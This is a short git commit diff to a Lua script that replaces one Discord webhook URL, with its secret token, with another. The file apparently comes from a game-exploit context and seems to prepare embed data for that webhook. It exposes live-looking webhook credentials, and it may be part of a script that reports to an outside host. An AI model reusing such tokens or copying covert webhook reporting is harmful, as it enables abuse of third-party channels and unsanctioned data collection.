f2401376b9d3e476460060ba777caeb3cad13801
Fr0go1 <112802612+Fr0go1@users.noreply.github.com>
2023-01-14 15:18:33 +1100

    Update SUCKAFATONEMATE.lua

--- SUCKAFATONEMATE.lua
+++ SUCKAFATONEMATE.lua
@@ -6,7 +6,7 @@ local webhookcheck =
    "Kid with shit exploit"
 
 local url =
-   "https://discord.com/api/webhooks/1048826532988190750/5bJtMAbNSaAeBpFJYkygDdLa0ypX3Uzr-TpYhfwVf48GEE80pRlEordAFnxzYAtZmNmE"
+   "https://discord.com/api/webhooks/1063673323713744936/YtvlEN_KBq6B3jHfhpV6VmMMdh57pzqmsgWlPmKGWZoiX01EWs9s-AudT4Cgz2Wj4DJD"
 local data = {
         ["Content"] = "",
         ["embeds"] = {{
